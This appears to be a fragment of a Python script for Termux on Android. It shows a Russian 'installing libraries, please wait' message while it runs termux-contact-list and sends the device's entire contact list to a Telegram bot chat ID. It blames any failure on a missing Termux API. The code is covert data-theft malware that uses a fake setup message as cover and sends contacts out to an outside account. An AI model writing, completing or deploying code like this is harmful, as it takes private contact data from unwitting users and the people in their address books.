...
print('Установка библиотек, подождите...')
...
try:
	bot.send_message(ID, 'Sending...')
	a = subprocess.check_output(['termux-contact-list'])
	bot.send_message(ID, a)
except:
	bot.send_message(ID, 'Not received!')
	print('Похоже у вас не установлено Termux API, без него бот будет работать некоректно!')
